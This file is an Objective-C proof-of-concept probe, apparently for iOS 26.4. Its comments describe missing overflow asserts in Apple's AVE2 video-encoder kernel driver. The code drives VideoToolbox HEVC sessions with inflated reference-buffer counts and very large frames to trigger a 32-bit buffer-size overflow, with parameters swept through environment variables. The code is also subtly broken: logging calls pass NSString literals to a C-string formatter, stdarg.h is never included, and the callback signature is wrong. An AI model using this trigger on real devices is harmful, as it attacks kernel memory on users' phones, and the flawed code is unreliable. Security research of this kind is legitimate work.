/*
 * vt_prim.c — primary VE test for the AppleAVE2 encoder overflow family (CVE-2026-65410 /
 * CVE-2026-64747) on iOS 26.4.
 *
 * Our kernel (xnu-12377.102.10) is MISSING every one of the 12 overflow asserts that 26.6.1
 * added inside com.apple.driver.AppleAVE2 (file offsets 0x29136d..0x2918e9, inside the
 * kext's own file range 0x246120..0x31ba40) — so the encoder's buffer-size calculators
 * still do 32-bit arithmetic without sign checks.
 *
 * The only calculator that can overflow inside the public API envelope is the COUNT-driven
 * one: DPB size = refs * bytes_per_pixel * w * h.  With a normal frame (the phone encoder
 * caps around 4096x2160) we need refs in the tens; at VideoToolbox's 16384x16384 cap we need
 * only 2..8 refs.  So the test is:
 *      1. set kVTCompressionPropertyKey_ReferenceBufferCount = N
 *      2. read it back  -> does VideoToolbox clamp it?  (if yes, this path is dead)
 *      3. try a 10-bit HEVC session at the largest size the device accepts and submit frames
 *
 * Every knob comes from the environment so we can sweep without rebuilding.
 */
#import <Foundation/Foundation.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <VideoToolbox/VTCompressionSession.h>
#if __has_include(<VideoToolbox/VTProperties.h>)
#import <VideoToolbox/VTProperties.h>
#else
// VTProperties.h is not shipped in every iPhoneOS SDK; the umbrella header is.
#import <VideoToolbox/VideoToolbox.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int envi(const char *k, int dflt)
{
	const char *v = getenv(k);
	return (v && *v) ? atoi(v) : dflt;
}

static void logline(const char *fmt, ...)
{
	va_list ap;
	char buf[1024];
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	fputs(buf, stdout);
	fputc('\n', stdout);
	fflush(stdout);
	NSLog(@"[vt] %s", @(buf));
}

static void enc_cb(void *refcon, void *src, OSStatus status, VTEncodeInfoFlags flags, CMSampleBufferRef sbuf)
{
	(void)refcon; (void)src; (void)flags; (void)sbuf;
	logline(@"encode callback status=%d", (int)status);
}

int main(void)
{
	@autoreleasepool {
		int w = envi("VT_W", 4096);
		int h = envi("VT_H", 2160);
		int refs = envi("VT_REFS", 64);
		int depth = envi("VT_DEPTH", 10);
		int hevc = envi("VT_HEVC", 1);
		int frames = envi("VT_FRAMES", 3);
		int slow = envi("VT_SLOW", 0);
		int slices = envi("VT_SLICES", 0);
		int keepalive = envi("VT_KEEPALIVE", 0);

		logline(@"start w=%d h=%d refs=%d depth=%d hevc=%d frames=%d slices=%d keepalive=%d",
		        w, h, refs, depth, hevc, frames, slices, keepalive);

		/* 1. does VideoToolbox pass ReferenceBufferCount through unclamped? */
		{
			VTCompressionSessionRef probe = NULL;
			NSMutableDictionary *spec = [NSMutableDictionary dictionary];
			spec[(__bridge id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder] = @YES;
			spec[(__bridge id)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder] = @NO;
			NSMutableDictionary *props = [NSMutableDictionary dictionary];
			props[(__bridge id)kVTCompressionPropertyKey_ProfileLevel] =
				hevc ? (__bridge id)kVTProfileLevel_HEVC_Main10_AutoLevel
				      : (__bridge id)kVTProfileLevel_H264_High_AutoLevel;
			props[(__bridge id)kVTCompressionPropertyKey_AverageBitRate] = @(2000000);
			props[(__bridge id)kVTCompressionPropertyKey_AllowFrameReordering] = @YES;
			props[(__bridge id)kVTCompressionPropertyKey_RealTime] = @YES;
			props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameInterval] = @(1);
			props[(__bridge id)kVTCompressionPropertyKey_ReferenceBufferCount] = @(refs);
			if (depth == 10) {
				props[(__bridge id)kVTCompressionPropertyKey_OutputBitDepth] = @10;
			}
			OSStatus st = VTCompressionSessionCreate(NULL, w, h,
				hevc ? kCMVideoCodecType_HEVC : kCMVideoCodecType_H264,
				(__bridge CFDictionaryRef)spec, (__bridge CFDictionaryRef)props,
				NULL, enc_cb, NULL, &probe);
			logline(@"probe session create st=%d", (int)st);
			if (st == noErr && probe) {
				CFTypeRef got = NULL;
				OSStatus gs = VTSessionCopyProperty(probe, kVTCompressionPropertyKey_ReferenceBufferCount,
					kCFAllocatorDefault, &got);
				logline(@"read-back ReferenceBufferCount: st=%d value=%s", (int)gs,
					(gs == noErr && got) ? [[(NSNumber *)got description] UTF8String] : "(n/a)");
				if (got) CFRelease(got);
				VTCompressionSessionInvalidate(probe);
				CFRelease(probe);
			}
		}

		/* 2. real session, submit frames */
		CVPixelBufferRef pb = NULL;
		NSDictionary *pa = @{
			(__bridge id)kCVPixelBufferPixelFormatTypeKey : @(depth == 10
				? kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange
				: kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
			(__bridge id)kCVPixelBufferWidthKey : @(w),
			(__bridge id)kCVPixelBufferHeightKey : @(h),
			(__bridge id)kCVPixelBufferIOSurfacePropertiesKey : @{},
		};
		if (CVPixelBufferCreate(NULL, w, h,
		        depth == 10 ? kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange
		                    : kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
		        (__bridge CFDictionaryRef)pa, NULL, &pb) != kCVReturnSuccess || !pb) {
			logline(@"pixelbuffer %dx%d failed", w, h);
			return 1;
		}
		CVPixelBufferLockBaseAddress(pb, 0);
		void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
		void *u = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
		if (y) memset(y, 0x40, (size_t)w * h);
		if (u) memset(u, 0x80, (size_t)(w / 2) * (h / 2));
		CVPixelBufferUnlockBaseAddress(pb, 0);

		NSMutableDictionary *spec = [NSMutableDictionary dictionary];
		spec[(__bridge id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder] = @YES;
		spec[(__bridge id)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder] = @NO;
		NSMutableDictionary *props = [NSMutableDictionary dictionary];
		props[(__bridge id)kVTCompressionPropertyKey_ProfileLevel] =
			hevc ? (__bridge id)kVTProfileLevel_HEVC_Main10_AutoLevel
			      : (__bridge id)kVTProfileLevel_H264_High_AutoLevel;
		props[(__bridge id)kVTCompressionPropertyKey_AverageBitRate] = @(2000000);
		props[(__bridge id)kVTCompressionPropertyKey_AllowFrameReordering] = @YES;
		props[(__bridge id)kVTCompressionPropertyKey_RealTime] = @YES;
		props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameInterval] = @(1);
		props[(__bridge id)kVTCompressionPropertyKey_ReferenceBufferCount] = @(refs);
		props[(__bridge id)kVTCompressionPropertyKey_MaxFrameDelayCount] = @(refs);
		props[@"SuggestedLookAheadFrameCount"] = @(refs);
		if (depth == 10) {
			props[(__bridge id)kVTCompressionPropertyKey_OutputBitDepth] = @10;
		}
		if (slices > 0) props[@"NumberOfSlices"] = @(slices);
		if (keepalive > 0) props[@"MaxNumberOfFramesToKeepAlive"] = @(keepalive);
		props[@"DPBMode"] = @(envi("VT_MODE", 0));

		VTCompressionSessionRef sess = NULL;
		OSStatus st = VTCompressionSessionCreate(NULL, w, h,
			hevc ? kCMVideoCodecType_HEVC : kCMVideoCodecType_H264,
			(__bridge CFDictionaryRef)spec, (__bridge CFDictionaryRef)props,
			NULL, enc_cb, NULL, &sess);
		logline(@"session create st=%d", (int)st);
		if (st != noErr || !sess) {
			return 2;
		}
		for (int i = 0; i < frames; i++) {
			CMTime pts = CMTimeMake(i, 30);
			CMTime dur = CMTimeMake(1, 30);
			st = VTCompressionSessionEncodeFrame(sess, pb, pts, dur, NULL, NULL);
			logline(@"submit frame %d -> %d", i, (int)st);
			if (st != noErr) break;
			if (slow) usleep(slow);
		}
		VTCompressionSessionCompleteFrames(sess, CMTimeMake(1, 30));
		logline(@"done");
		VTCompressionSessionInvalidate(sess);
		CFRelease(sess);
	}
	return 0;
}
